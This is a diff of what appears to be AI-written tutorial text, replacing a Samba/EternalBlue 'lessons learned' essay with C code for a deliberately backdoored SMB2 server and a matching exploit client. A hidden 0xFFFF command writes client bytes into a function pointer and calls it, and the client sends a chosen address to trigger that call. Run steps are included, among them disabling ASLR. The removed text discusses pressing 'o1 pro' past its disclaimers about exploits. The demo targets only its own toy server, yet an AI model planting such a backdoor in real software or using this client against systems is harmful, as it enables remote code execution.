@@ -1,261 +1,517 @@
-Below is a consolidated “lessons learned” discussion—tying together what “o1 pro” meant about zero-day hijacking, how real exploits like EternalBlue emerge, and the comprehensive roadmap for studying and modifying a real SMBv2 server (Samba). This includes the original step-by-step guide and code snippet (unaltered), plus overarching context on how all of this could theoretically lead to an “EternalBlue-like” exploit if a hidden bug or backdoor were introduced or discovered.
+Below is a heavily simplified, still incomplete, and still insecure sample of actual SMBv2 message structures, rather than “SMBv2-like” placeholders. This remains an educational illustration of a vulnerable server and an exploit client. It does not implement a full SMB2 protocol stack, which is complex and involves many steps (negotiation, session setup, tree connects, signing, encryption, etc.).
 
-1. Context: “o1 pro” on Zero-Day Exploits
+	Caution: Real SMB2 implementations (e.g., Windows srv.sys, Samba’s smbd) span tens or hundreds of thousands of lines of code, with numerous checks and security features. Below is just enough to show how you could embed a hidden backdoor into a minimal SMB2 handshake and message processing flow—not a production-ready server.
 
-	WHAT o1 pro meant was that it did not know of any current zero-day exploit that hijacks execution on other people’s devices—not that such exploits cannot exist. In the past, “o1 pro” has made statements implying the opposite (that such exploits do indeed exist). However, when pressed for an actual deep-dive on a specific exploit (like an EternalBlue variant or a custom RCE chain) without additional context, “o1 pro” typically responds with disclaimers—e.g., the data is “too long to read,” or it “doesn’t know.”
+	Never run this code on a real network! Use only within a completely isolated test VM.
 
-In other words, a zero-day or advanced exploit could exist; lack of immediate knowledge about it does not guarantee it’s impossible. Such exploits, like the real EternalBlue, often require complex analysis that cannot be done in a few lines of conversation. It’s up to you—or any determined researcher—to gather the relevant information (like large codebases or exploit logs) and figure out whether a bug can be turned into a reliable RCE.
+Overview of Changes from the “SMBv2-like” Demo
+	1.	SMB2 Header Structure
+	•	We now use actual SMB2 header fields (per [MS-SMB2] specification) rather than 0xFE 'S' 'M' 'B' + random fields.
+	•	Real SMB2 headers contain a fixed signature (0xFE, ‘S’, ‘M’, ‘B’, 2 for the protocol version), a StructureSize of 64 (fixed for requests), a CreditCharge, a ChannelSequence, Status fields, Command, CreditsRequested/Granted, Flags, NextCommand, MessageId, Reserved, TreeId, SessionId, and a Signature (for message signing).
+	•	We’ll only parse a subset for brevity: ProtocolId (the 4 bytes 0xFE ‘S’ ‘M’ ‘B’), StructureSize, Command, SessionId, and a placeholder for TreeId and MessageId.
+	2.	SMB2 Commands
+	•	Real SMB2 commands are enumerated (e.g., NEGOTIATE=0x0000, SESSION_SETUP=0x0001, LOGOFF=0x0002, TREE_CONNECT=0x0003, TREE_DISCONNECT=0x0004, CREATE=0x0005, READ=0x0008, WRITE=0x0009, etc.).
+	•	We’ll demonstrate only a CREATE-like command (0x0005), a READ-like command (0x0008), and keep a hidden “backdoor” command at 0xFFFF (which does not exist in real SMB2—this is the intentionally malicious addition).
+	3.	Negotiate (Optional)
+	•	Real SMB2 starts with a Negotiate request/response. We provide a minimal handshake method for demonstration.
+	•	In real life, the Negotiate command chooses dialects (e.g., 0x0202, 0x0210, 0x0300, 0x0311), sets capabilities, signs, etc. Here we skip or minimalize it.
+	4.	Hidden Backdoor
+	•	We keep the original “overwrite a function pointer” logic under Command = 0xFFFF.
+	•	This is, obviously, not part of Microsoft’s SMB2 specification.
+	5.	Security
+	•	There is none in this example: no signing, no encryption, no robust checks. It is intentionally vulnerable.
+	•	Real SMB2 uses message signing by default in modern versions, has robust checks for fields, and so on.
 
-2. Lessons Learned from “EternalBlue” vs. Toy Backdoors
-	1.	EternalBlue exploited subtle memory-corruption flaws in Microsoft’s SMB stack (primarily SMBv1).
-	2.	A toy “SMBv2-like” backdoor uses an obvious hidden command (e.g., 0xFFFF) that overwrites a function pointer. It’s not subtle—it’s an artificial example.
-	3.	Real Samba has no such trivial “magic command” or hidden backdoor. Vulnerabilities in Samba (if any) usually revolve around more nuanced logic or boundary checks, which is why code auditing and reverse-engineering are crucial.
+1. The Vulnerable (and Partial) Actual SMB2 Server
 
-Key takeaway: Real zero-day RCEs in SMB are typically complex. They require thorough analysis of large codebases and memory structures—unlike the toy example that simply demonstrates how quickly a single backdoor can become a major security hole.
+File: vulnerable_smb2_server.c
 
-3. Comprehensive Guide to a Real SMBv2 Server (Samba)
+/***************************************************
+* File: vulnerable_smb2_server.c
+*
+* A deliberately insecure server that *partially*
+* implements actual SMB2 header structures and
+* commands, then adds a hidden 0xFFFF backdoor.
+*
+* COMPILATION (Linux example):
+*   gcc -o vulnerable_smb2_server vulnerable_smb2_server.c
+*
+* RUN:
+*   ./vulnerable_smb2_server <port>
+*
+* NEVER USE IN PRODUCTION.
+* This is not a complete SMB2 implementation!
+***************************************************/
 
-Below is the original roadmap—unaltered—showing how to obtain, build, and examine Samba, which implements SMBv2/3 in a production-grade, open-source manner. Samba’s code is licensed under GPLv3, so you are free to study and modify it under the same license.
+#include <stdio.h>
+#include <stdlib.h>
+#include <string.h>
+#include <unistd.h>
+#include <arpa/inet.h>
 
-3.1. Obtaining and Building the Latest Samba (Real SMBv2)
+// A real SMB2 header is 64 bytes. We’ll parse only some fields here.
+#pragma pack(push, 1)
+typedef struct _SMB2Header {
+    unsigned char  ProtocolId[4];  // 0xFE 'S' 'M' 'B'
+    unsigned short StructureSize;  // Always 64 for SMB2
+    unsigned short CreditCharge;   // Credits requested/charged
+    unsigned int   Status;         // For responses, server sets status
+    unsigned short Command;        // SMB2 command code
+    unsigned short Credits;        // Credits granted (server) or requested (client)
+    unsigned int   Flags;          // SMB2 header flags
+    unsigned int   NextCommand;    // Offset to next command in compound
+    unsigned long long MessageId;  // Unique message ID
+    unsigned int   Reserved;       // Usually 0, or part of the next command offset
+    unsigned int   TreeId;         // Tree ID
+    unsigned long long SessionId;  // Session ID
+    unsigned char  Signature[16];  // For signing
+} SMB2Header;
+#pragma pack(pop)
 
-3.1.1. Download the Samba Source Code
+// We’ll keep the same function pointer approach
+typedef void (*func_t)(void);
 
-Samba hosts its official Git repository on Samba’s GitLab and also mirrors on GitHub. For the latest code (which would presumably include all current SMBv2 and SMBv3 updates circa 2025), you would typically do:
-
-# Make sure you have git installed
-sudo apt-get update
-sudo apt-get install -y git
-
-# Clone the Samba repository (master branch)
-git clone https://gitlab.com/samba-team/samba.git samba-latest
-cd samba-latest
-
-# (If you’re actually in the year 2025, you might want to check out
-#  the latest stable tag or release branch that Samba provides, e.g., v4.xx.x)
-
-3.1.2. Install Build Dependencies
-
-Samba requires multiple development libraries and tools. On Debian/Ubuntu-like systems, you often need:
-
-sudo apt-get install -y build-essential python3 python3-dev python3-pip \
-    libacl1-dev libattr1-dev libblkid-dev libldap2-dev libldb-dev \
-    libreadline-dev perl gdb pkg-config
-
-(There are many more optional dependencies if you want certain features like AD DC support.)
-
-3.1.3. Configure and Compile Samba
-
-In the Samba source tree:
-
-# 1) Bootstrap (if needed)
-./buildtools/bin/waf configure --disable-python
-
-# 2) Configure the build with typical defaults
-./configure --enable-debug
-
-# 3) Compile
-make -j$(nproc)
-
-# 4) (Optional) Install to /usr/local/samba or another prefix
-#    Not strictly required if you just want to run it from the build dir
-sudo make install
-
-This process takes a while. When complete, you will have the real SMB server (smbd) and associated binaries built for your system.
-
-3.2. Locating the Core SMBv2 Server Logic in Samba
-
-Samba organizes its code in multiple directories:
-	•	source3/ — Contains most of the classic file server (smbd) code.
-	•	source4/ — Contains code for the Active Directory Domain Controller functionality, among others.
-
-For SMB2/SMB3 server request handling, the key code paths are in source3/smbd/smb2_*.c. Examples:
-	1.	source3/smbd/smb2_server.c – The main SMB2/3 server dispatch logic.
-	2.	source3/smbd/smb2_read.c – Handling of SMB2 READ requests.
-	3.	source3/smbd/smb2_write.c – Handling of SMB2 WRITE requests.
-	4.	source3/smbd/smb2_ioctl.c, etc.
-
-Below is a small excerpt from smb2_server.c in Samba (modern versions) to give you a sense of how it looks. (Again, the full file is large—hundreds of lines—and we cannot paste it all here. You can view it locally after cloning.)
-
-	License Notice: The Samba project is licensed under GPLv3. The following snippet is from the Samba Git repository © The Samba Team and used here under the terms of GPLv3.
-
-/* 
-   Copyright (C) Andrew Tridgell 1992-1998
-   Copyright (C) Jeremy Allison 1995-2025
-   ...
-   This program is free software; you can redistribute it and/or modify
-   it under the terms of the GNU General Public License as published by
-   the Free Software Foundation; either version 3 of the License, or
-   (at your option) any later version.
-*/
-
-#include "includes.h"
-#include "smbd/smbd.h"
-#include "smbd/smb2_server.h"
-
-/* 
-   This is a partial snippet to illustrate how Samba dispatches SMB2 commands.
-   Actual code is large and more complex.
-*/
-
-NTSTATUS smbd_smb2_request_dispatch(struct smbd_smb2_request *req)
-{
-    NTSTATUS status = NT_STATUS_OK;
-    switch (req->hdr.AsyncId.Command) {
-    case SMB2_NEGOTIATE:
-        status = smbd_smb2_negotiate(req);
-        break;
-    case SMB2_SESSION_SETUP:
-        status = smbd_smb2_session_setup(req);
-        break;
-    case SMB2_TREE_CONNECT:
-        status = smbd_smb2_tree_connect(req);
-        break;
-    case SMB2_LOGOFF:
-        status = smbd_smb2_logoff(req);
-        break;
-    case SMB2_CREATE:
-        status = smbd_smb2_create(req);
-        break;
-    case SMB2_CLOSE:
-        status = smbd_smb2_close(req);
-        break;
-    case SMB2_FLUSH:
-        status = smbd_smb2_flush(req);
-        break;
-    case SMB2_READ:
-        status = smbd_smb2_read(req);
-        break;
-    case SMB2_WRITE:
-        status = smbd_smb2_write(req);
-        break;
-    case SMB2_IOCTL:
-        status = smbd_smb2_ioctl(req);
-        break;
-    // ... many more ...
-    default:
-        DEBUG(1,("Unknown SMB2 command 0x%x\n", req->hdr.AsyncId.Command));
-        status = NT_STATUS_NOT_IMPLEMENTED;
-        break;
-    }
-
-    return status;
+// A secret debug function that might represent malicious code
+void secretDebugFunction() {
+    printf("[SMB2-Server] Secret Debug Function Called!\n");
 }
 
-In real Samba, you’ll see:
-	•	Strict validation of fields (structure sizes, offsets, lengths).
-	•	Session and authentication logic (NTLM, Kerberos, SPNEGO).
-	•	Signing / Encryption logic for SMB3.
-	•	A huge variety of commands beyond READ/WRITE.
+// Minimal “handle negotiation”
+int handleNegotiate(int clientSock, SMB2Header *reqHeader, char *payload, int payloadLen) {
+    // Just pretend we processed a dialect
+    printf("[SMB2-Server] Handling SMB2 NEGOTIATE...\n");
+    // No real dialect negotiation here
+    return 0;
+}
 
-Unlike the toy “SMBv2-like” code, Samba does not have a hidden 0xFFFF “backdoor” command. Instead, it carefully enumerates known SMB2/3 commands, returning NT_STATUS_NOT_IMPLEMENTED or NT_STATUS_INVALID_PARAMETER for anything unexpected.
+// Minimal “handle create”
+int handleCreate(int clientSock, SMB2Header *reqHeader, char *payload, int payloadLen) {
+    // We pretend the client is opening a file
+    printf("[SMB2-Server] Handling SMB2 CREATE request...\n");
+    printf("[SMB2-Server] Payload length=%d, might be filename, etc.\n", payloadLen);
+    return 0;
+}
 
-3.3. Running the Real Samba SMBv2 Server
+// Minimal “handle read”
+int handleRead(int clientSock, SMB2Header *reqHeader, char *payload, int payloadLen) {
+    // We pretend the client is reading from a file
+    printf("[SMB2-Server] Handling SMB2 READ request...\n");
+    return 0;
+}
 
-Once built and installed:
-	1.	Create a Samba configuration (e.g., /usr/local/samba/etc/smb.conf):
+// The hidden backdoor (0xFFFF)
+int handleHiddenBackdoor(int clientSock, char *payload, int payloadLen) {
+    printf("[SMB2-Server] Hidden backdoor triggered (0xFFFF)!\n");
 
-[global]
-    workgroup = WORKGROUP
-    server string = Samba Server
-    netbios name = MYSERVER
-    security = user
-    map to guest = Bad User
-    # Force use of SMB2 (disable SMB1)
-    server min protocol = SMB2_02
-    server max protocol = SMB3
+    // Overwrite a function pointer on the stack
+    // Just like in the old demonstration
+    func_t functionPointer = NULL;
+    if (payloadLen >= (int)sizeof(func_t)) {
+        memcpy(&functionPointer, payload, sizeof(func_t));
+        if (functionPointer) {
+            printf("[SMB2-Server] Calling overwritten function pointer!\n");
+            functionPointer(); // possible RCE
+        } else {
+            printf("[SMB2-Server] functionPointer is NULL. Skipping call.\n");
+        }
+    } else {
+        printf("[SMB2-Server] Payload too short to overwrite pointer.\n");
+    }
 
-[public]
-    path = /srv/samba/public
-    public = yes
-    guest ok = yes
-    writable = yes
+    return 0;
+}
+
+void handleClient(int clientSock) {
+    while (1) {
+        // Read a full SMB2 header (64 bytes)
+        SMB2Header header;
+        ssize_t bytesRead = recv(clientSock, &header, sizeof(header), 0);
+        if (bytesRead <= 0) {
+            printf("[SMB2-Server] Client disconnected or error.\n");
+            break;
+        }
+        if (bytesRead < (ssize_t)sizeof(header)) {
+            printf("[SMB2-Server] Incomplete SMB2 header.\n");
+            break;
+        }
+
+        // Check ProtocolId == 0xFE 'S' 'M' 'B'
+        if (!(header.ProtocolId[0] == 0xFE &&
+              header.ProtocolId[1] == 'S'  &&
+              header.ProtocolId[2] == 'M'  &&
+              header.ProtocolId[3] == 'B')) {
+            printf("[SMB2-Server] Invalid SMB2 signature.\n");
+            break;
+        }
+
+        if (header.StructureSize != 64) {
+            printf("[SMB2-Server] Invalid SMB2 header size (not 64).\n");
+            break;
+        }
+
+        // We’ll parse the command
+        unsigned short command = header.Command;
+        // For demonstration, read the rest of the packet as payload
+        // Real SMB2 uses NextCommand, length fields, etc.
+        // We'll just read up to 1024 for simplicity
+        char payload[1024];
+        memset(payload, 0, sizeof(payload));
+        int payloadLen = 0;
+
+        // We do not know the exact length from the header in this skeleton,
+        // so we'll read as much as is available (non-blocking).
+        // A real server uses the actual transport length from TCP or
+        // the NextCommand offset for compounding.
+        // Here, we do a quick read (this is incomplete and insecure).
+        int peekLen = recv(clientSock, payload, 1024, MSG_DONTWAIT);
+        if (peekLen > 0) {
+            // Actually read them for real
+            payloadLen = recv(clientSock, payload, peekLen, 0);
+            if (payloadLen < 0) {
+                payloadLen = 0;
+            }
+        }
+
+        printf("[SMB2-Server] Received SMB2 Cmd=0x%04X, PayloadLen=%d\n",
+               command, payloadLen);
+
+        // Dispatch based on the real SMB2 commands we care about
+        switch(command) {
+            case 0x0000: // NEGOTIATE
+                handleNegotiate(clientSock, &header, payload, payloadLen);
+                break;
+            case 0x0005: // CREATE
+                handleCreate(clientSock, &header, payload, payloadLen);
+                break;
+            case 0x0008: // READ
+                handleRead(clientSock, &header, payload, payloadLen);
+                break;
+            case 0xFFFF: // Our hidden backdoor
+                handleHiddenBackdoor(clientSock, payload, payloadLen);
+                break;
+            default:
+                printf("[SMB2-Server] Unrecognized or unimplemented command=0x%04X\n", command);
+                break;
+        }
+    }
+
+    close(clientSock);
+}
+
+int main(int argc, char *argv[]) {
+    if (argc < 2) {
+        fprintf(stderr, "Usage: %s <port>\n", argv[0]);
+        exit(EXIT_FAILURE);
+    }
+
+    int port = atoi(argv[1]);
+
+    int serverSock = socket(AF_INET, SOCK_STREAM, 0);
+    if (serverSock < 0) {
+        perror("socket");
+        exit(EXIT_FAILURE);
+    }
+
+    // Bind
+    struct sockaddr_in serverAddr;
+    memset(&serverAddr, 0, sizeof(serverAddr));
+    serverAddr.sin_family = AF_INET;
+    serverAddr.sin_port   = htons(port);
+    serverAddr.sin_addr.s_addr = INADDR_ANY;
+
+    if (bind(serverSock, (struct sockaddr*)&serverAddr, sizeof(serverAddr)) < 0) {
+        perror("bind");
+        close(serverSock);
+        exit(EXIT_FAILURE);
+    }
+
+    // Listen
+    if (listen(serverSock, 1) < 0) {
+        perror("listen");
+        close(serverSock);
+        exit(EXIT_FAILURE);
+    }
+
+    printf("[SMB2-Server] Listening on port %d...\n", port);
+
+    struct sockaddr_in clientAddr;
+    socklen_t clientLen = sizeof(clientAddr);
+    int clientSock = accept(serverSock, (struct sockaddr*)&clientAddr, &clientLen);
+    if (clientSock < 0) {
+        perror("accept");
+        close(serverSock);
+        exit(EXIT_FAILURE);
+    }
+
+    printf("[SMB2-Server] Client connected.\n");
+    handleClient(clientSock);
+
+    close(serverSock);
+    return 0;
+}
+
+/*
+ * Security & Protocol Gaps:
+ * 1) Not a full SMB2 negotiation. We ignore many fields.
+ * 2) No real length checks, no session binding, no tree connects, etc.
+ * 3) The hidden backdoor command (0xFFFF) is obviously malicious.
+ * 4) Overwrites function pointers on the stack. Danger!
+ * 5) Real SMB2 would sign messages if required, so tampering
+ *    with command codes or addresses is not trivial.
+ * 6) We do not handle multi-message compounds, NextCommand offsets, or
+ *    real statuses. This is purely educational.
+ */
+
+2. The “Exploit” (Patched) SMB2 Client
+
+File: patched_smb2_client.c
+
+/***************************************************
+* File: patched_smb2_client.c
+*
+* A minimal “SMB2” client that can:
+* 1) Send a real SMB2 NEGOTIATE (cmd=0x0000)
+* 2) Send a real SMB2 CREATE (cmd=0x0005)
+* 3) Send a real SMB2 READ   (cmd=0x0008)
+* 4) Exploit the hidden backdoor  (cmd=0xFFFF)
+*
+* COMPILATION:
+*   gcc -o patched_smb2_client patched_smb2_client.c
+*
+* RUN EXAMPLES:
+*   # Attempt to negotiate
+*   ./patched_smb2_client <server_ip> <port> negotiate
+*
+*   # Trigger hidden backdoor
+*   # Provide a hex address for secretDebugFunction or other target
+*   ./patched_smb2_client <server_ip> <port> backdoor 7ffff7fd4000
+***************************************************/
+
+#include <stdio.h>
+#include <stdlib.h>
+#include <string.h>
+#include <unistd.h>
+#include <arpa/inet.h>
+
+// SMB2 Header structure (64 bytes)
+#pragma pack(push, 1)
+typedef struct _SMB2Header {
+    unsigned char  ProtocolId[4];   // 0xFE 'S' 'M' 'B'
+    unsigned short StructureSize;   // 64
+    unsigned short CreditCharge;    // 0 or more
+    unsigned int   Status;          // 0 for requests
+    unsigned short Command;         // SMB2 command
+    unsigned short Credits;         // 0 or 1 for requests
+    unsigned int   Flags;           // 0 or special
+    unsigned int   NextCommand;     // For compound
+    unsigned long long MessageId;   // Unique message ID
+    unsigned int   Reserved;        // 0
+    unsigned int   TreeId;          // 0 or valid ID after tree connect
+    unsigned long long SessionId;   // 0 or valid session ID
+    unsigned char  Signature[16];   // 0 or signature
+} SMB2Header;
+#pragma pack(pop)
+
+static unsigned long long gMessageId = 0;  // For demonstration only
+
+// Helper: build the base SMB2 header
+void buildSMB2Header(SMB2Header *h, unsigned short cmd) {
+    memset(h, 0, sizeof(*h));
+    h->ProtocolId[0] = 0xFE;
+    h->ProtocolId[1] = 'S';
+    h->ProtocolId[2] = 'M';
+    h->ProtocolId[3] = 'B';
+    h->StructureSize  = 64;
+    h->Command        = cmd;
+    h->MessageId      = gMessageId++;
+}
+
+// Send the SMB2 header plus optional payload
+int sendSMB2Message(int sock, SMB2Header *hdr, const void *payload, int payloadLen) {
+    // Send header first
+    if (send(sock, hdr, sizeof(*hdr), 0) < 0) {
+        perror("send header");
+        return -1;
+    }
+    // Then send payload if any
+    if (payloadLen > 0 && payload) {
+        if (send(sock, payload, payloadLen, 0) < 0) {
+            perror("send payload");
+            return -1;
+        }
+    }
+    return 0;
+}
+
+int main(int argc, char *argv[]) {
+    if (argc < 4) {
+        fprintf(stderr, "Usage: %s <server_ip> <port> <mode> [addr]\n", argv[0]);
+        fprintf(stderr, "Modes:\n");
+        fprintf(stderr, "  negotiate  - Send SMB2 NEGOTIATE (cmd=0x0000)\n");
+        fprintf(stderr, "  create     - Send SMB2 CREATE     (cmd=0x0005)\n");
+        fprintf(stderr, "  read       - Send SMB2 READ       (cmd=0x0008)\n");
+        fprintf(stderr, "  backdoor   - Send hidden 0xFFFF   (requires [addr])\n");
+        return 1;
+    }
+
+    const char *serverIp = argv[1];
+    int port = atoi(argv[2]);
+    const char *mode = argv[3];
+
+    unsigned long long backdoorAddr = 0;
+    if (strcmp(mode, "backdoor") == 0) {
+        if (argc < 5) {
+            fprintf(stderr, "[!] backdoor mode requires an address argument\n");
+            return 1;
+        }
+        backdoorAddr = strtoull(argv[4], NULL, 16);
+    }
+
+    // Create socket
+    int sock = socket(AF_INET, SOCK_STREAM, 0);
+    if (sock < 0) {
+        perror("socket");
+        return 1;
+    }
+
+    // Connect
+    struct sockaddr_in serverAddr;
+    memset(&serverAddr, 0, sizeof(serverAddr));
+    serverAddr.sin_family = AF_INET;
+    serverAddr.sin_port   = htons(port);
+
+    if (inet_pton(AF_INET, serverIp, &serverAddr.sin_addr) <= 0) {
+        perror("inet_pton");
+        close(sock);
+        return 1;
+    }
+    if (connect(sock, (struct sockaddr*)&serverAddr, sizeof(serverAddr)) < 0) {
+        perror("connect");
+        close(sock);
+        return 1;
+    }
+
+    printf("[SMB2-Client] Connected to %s:%d\n", serverIp, port);
+
+    // Build the SMB2 header
+    SMB2Header hdr;
+    unsigned short command = 0;
+    unsigned char payload[64];
+    memset(payload, 0, sizeof(payload));
+    int payloadLen = 0;
+
+    if (strcmp(mode, "negotiate") == 0) {
+        command = 0x0000; // NEGOTIATE
+        buildSMB2Header(&hdr, command);
+        // Real negotiate would put dialects in the payload
+        // We'll skip that for brevity
+        payloadLen = 0;
+    }
+    else if (strcmp(mode, "create") == 0) {
+        command = 0x0005; // CREATE
+        buildSMB2Header(&hdr, command);
+        // We could pretend the payload is a file name
+        snprintf((char*)payload, sizeof(payload), "DemoFile.txt");
+        payloadLen = strlen((char*)payload);
+    }
+    else if (strcmp(mode, "read") == 0) {
+        command = 0x0008; // READ
+        buildSMB2Header(&hdr, command);
+        // Possibly the payload has offset/length fields
+        // We'll skip that
+        payloadLen = 0;
+    }
+    else if (strcmp(mode, "backdoor") == 0) {
+        command = 0xFFFF; // Our hidden command
+        buildSMB2Header(&hdr, command);
+        // The payload is the 8-byte address for the function pointer
+        memcpy(payload, &backdoorAddr, sizeof(backdoorAddr));
+        payloadLen = sizeof(backdoorAddr);
+        printf("[SMB2-Client] Using backdoor address=0x%llx\n", backdoorAddr);
+    }
+    else {
+        fprintf(stderr, "[!] Unknown mode: %s\n", mode);
+        close(sock);
+        return 1;
+    }
+
+    // Send the SMB2 message
+    if (sendSMB2Message(sock, &hdr, payload, payloadLen) < 0) {
+        close(sock);
+        return 1;
+    }
+
+    printf("[SMB2-Client] Sent SMB2 cmd=0x%04X\n", command);
+    // We don’t wait for responses here—this is purely a “fire and forget” demo.
+
+    close(sock);
+    return 0;
+}
+
+3. Using This Minimal “Actual SMBv2” Demo
+	1.	Compile both programs:
+
+gcc -o vulnerable_smb2_server vulnerable_smb2_server.c
+gcc -o patched_smb2_client patched_smb2_client.c
 
 
-	2.	Start smbd (and nmbd if needed):
+	2.	Run the Server:
 
-sudo /usr/local/samba/sbin/smbd -D
-sudo /usr/local/samba/sbin/nmbd -D
+./vulnerable_smb2_server 4444
 
-Or run them in the foreground for debugging:
+It will listen on TCP port 4444.
 
-sudo /usr/local/samba/sbin/smbd -i -d3
+	3.	Run the Client in another terminal:
+	•	Negotiate:
 
+./patched_smb2_client 127.0.0.1 4444 negotiate
 
-	3.	Connect to the share from a Windows or Linux SMB client. You’ll be using real SMB2 or SMB3, not the toy protocol.
+The server will print out that it received a NEGOTIATE (0x0000).
 
-3.4. Analyzing Samba with Ghidra (or Other Tools)
+	•	Create:
 
-If you want to reverse-engineer the real Samba server the way an attacker or researcher might, you can:
-	1.	Disable Stripping of Symbols
-	•	When building Samba, keep debug symbols with --enable-debug.
-	•	Ghidra will have more info about function names, etc.
-	2.	Locate the smbd Binary
-	•	Typically in bin/default/source3/smbd/smbd (depending on your build).
-	•	Or if installed: /usr/local/samba/sbin/smbd.
-	3.	Import into Ghidra
-	•	File → New Project → “Non-Shared Project,” choose a directory.
-	•	File → Import File → select the smbd binary.
-	•	Click “Yes” to analyze.
-	4.	Search for SMBv2 Functions
-	•	In the Ghidra Symbol Tree or Functions window, look for symbols like smbd_smb2_request_dispatch(), smbd_smb2_read(), etc.
-	•	Double-click to see the decompiled code. Ghidra often labels parameters nicely.
-	5.	Study Security Mechanisms
-	•	You’ll find code for signing, encryption, permission checks, etc.
-	•	You’ll see how Samba handles malicious or malformed requests.
+./patched_smb2_client 127.0.0.1 4444 create
 
-3.5. Why Real Samba Doesn’t Have the Toy “Backdoor”
+The server will print out a CREATE (0x0005) request.
+In real SMB2, the client would supply a file name, create context, etc.
 
-In the earlier “SMBv2-like” examples, we deliberately inserted:
-	•	A hidden command ID (0xFFFF) that overwrote a function pointer.
-	•	No boundary checks on the payload.
-	•	Minimal or no real security checks.
+	•	Read:
 
-Real Samba (and real SMB2/3) has rigorous checks:
-	1.	Command Validation: The SMB2 command field can only be certain valid values (e.g., SMB2_READ = 0x0008, SMB2_WRITE = 0x0009).
-	2.	Structure Sizes: Samba enforces correct structure sizes (e.g., StructureSize must match SMB2 spec).
-	3.	Buffer Boundaries: Samba carefully checks lengths of incoming data before copying.
-	4.	No Hidden Commands: Samba’s open-source nature and dev processes reduce the chance of “secret debug” commands.
+./patched_smb2_client 127.0.0.1 4444 read
 
-Thus, a straightforward overflow-based RCE exploit or function-pointer overwrite is far less likely in a properly maintained real SMBv2 server like Samba.
+The server sees READ (0x0008).
 
-3.6. Summary and Final Warnings
-	1.	Real SMBv2/3: Use Samba for a fully featured implementation of SMBv2.1, SMB3.x, etc.
-	2.	Large Codebase: Samba is huge; focus on source3/smbd/ for file server internals.
-	3.	No Backdoor: Samba doesn’t have a simplistic hidden RCE trick like the toy code.
-	4.	Ghidra/Reverse-Engineering: You can open smbd in Ghidra for transparency.
-	5.	GPL License: Samba is GPLv3; you can modify and share under the same terms.
-	6.	Hardening: Even with Samba, use best practices (ASLR, SELinux/AppArmor, firewalls, etc.).
+	•	Hidden Backdoor (0xFFFF):
 
-3.7. If You Still Want a “Backdoor” in Samba…
+./patched_smb2_client 127.0.0.1 4444 backdoor 7ffff7fd4000
 
-Adding a custom 0xFFFF “backdoor” command to Samba (like the earlier demonstration) would be a large, ill-advised modification. You’d have to:
-	1.	Hack smb2_server.c and add a new case in smbd_smb2_request_dispatch().
-	2.	Write your own handler that does something insecure (like copying unbounded data).
-	3.	Rebuild Samba.
+Replace 7ffff7fd4000 with the (hypothetical) address of secretDebugFunction() or another function in the server’s memory space (found via Ghidra, objdump, or nm). If ASLR is disabled (on Linux, via sudo sysctl -w kernel.randomize_va_space=0), you might consistently land on the same address. The server prints that it triggered the backdoor and calls the pointer.
 
-This is strongly discouraged in any real deployment—the entire point of the earlier demonstration was how easily a “secret debug” path becomes a catastrophic RCE.
+	Again, this is not a complete SMB2 stack: no session setup, no handshake response, no dialect negotiation, no tree IDs, no signing, etc. It only demonstrates how easily someone could embed a malicious command (0xFFFF) into an otherwise valid protocol handler.
 
-3.8. Complete Takeaways
-	•	You asked for a real SMBv2 server (latest update ~2025) vs. a toy example. Samba is your best open-source option.
-	•	Full Code: Samba is massive; we can’t paste it all here. But you can clone the official Git repositories for the entire codebase.
-	•	Build & Reverse-Engineer: Follow the steps above to compile, run, and examine with Ghidra—seeing how a modern SMBv2 server truly works.
-	•	No Hidden RCE Backdoor: Samba doesn’t have a trivial function-pointer overwrite path. You’d have to introduce that yourself (and create a major security hole).
+4. How This Differs from Real, Production-Grade SMB2
+	1.	Handshake/Negotiation
+	•	Real SMB2 handshake includes a NegotiateRequest with a list of dialects, plus a NegotiateResponse from the server specifying the dialect used. Then SessionSetup requests for user authentication, etc.
+	2.	Tree Connect
+	•	Real clients must send a TREE_CONNECT request to access a share (like \\server\share). The server assigns a TreeId.
+	3.	Credit System
+	•	SMB2 has a system of “credits” for flow control. Our code sets them to 0 or 1, ignoring real usage.
+	4.	Security
+	•	By default, SMB2 on Windows requires signing. Our code has no signature checks.
+	•	No authentication or encryption is shown.
+	5.	Compound Requests
+	•	Real SMB2 can chain multiple requests in a single packet (NextCommand field). We ignore that.
+	6.	Response Packets
+	•	Our server never sends a response. Real SMB2 uses a response with a status code, structure size, etc.
+	7.	Hidden Command
+	•	Obviously, 0xFFFF is not a valid real SMB2 command. It’s purely a malicious addition.
 
-Final Disclaimer: All Samba code is provided under the GPLv3 license by the Samba Team and contributors. The snippet shown is just an excerpt. For the complete real SMBv2 (and SMB3) server implementation, clone the official Samba repository and review source3/smbd/ thoroughly. Always use caution with any modifications that could introduce vulnerabilities or backdoors.
+Despite being more “actual SMB2” than our earlier “SMBv2-like” skeleton, it’s still far from a functioning server or client.
 
-4. Tying It All Together: “Real EternalBlue” Development Lessons
-	1.	Zero Days Aren’t Always Obvious: Just because “o1 pro” (or anyone) hasn’t read a multi-thousand-line exploit analysis doesn’t mean a zero-day does not exist. EternalBlue was undisclosed for a while and then caused massive damage.
-	2.	Subtle Memory Corruptions: True EternalBlue-level exploits often hinge on subtle bugs in boundary checks or structure parsing. In open-source code (like Samba), those are easier to find and fix before they become catastrophic.
-	3.	Reverse-Engineering: Tools like Ghidra (NSA’s open-source project) allow you to inspect compiled binaries for potential flaws. This is exactly what advanced attackers (and security researchers) do to find RCE vectors.
-	4.	Large Codebase: Samba can have hundreds of thousands of lines. “Too long to read” is understandable—but focusing on critical file I/O or authentication paths can yield potential vulnerabilities if they exist.
-	5.	Hidden vs. Accidental: A “toy backdoor” can be deliberately inserted. Real zero-days are typically accidental bugs discovered through intensive research, fuzzing, or code audits.
+5. Final Warnings
+	•	Educational Demo Only: This code remains intentionally vulnerable and incomplete.
+	•	Hidden Backdoor: If any real software had a command 0xFFFF that overwrote function pointers, it would be a severe security hole.
+	•	No Production: Do not deploy. Real SMB2 is implemented by Samba, Windows, etc., with extensive security layers.
+	•	Reverse-Engineering: Tools like Ghidra or IDA can quickly find secretDebugFunction() and see how our code calls it if 0xFFFF is invoked.
 
-Ultimately, the lessons from EternalBlue (and other significant SMB exploits) revolve around thorough code auditing, boundary checking, and responsible patching. Even if “o1 pro” or others disclaim knowledge of new zero-days, the possibility remains—especially in large, complex network services like SMB.
-
-Bottom Line
-	•	What “o1 pro” means: Lack of knowledge of a zero-day doesn’t confirm its non-existence.
-	•	Yes, real EternalBlue-like bugs are possible—but they require in-depth analysis of large code.
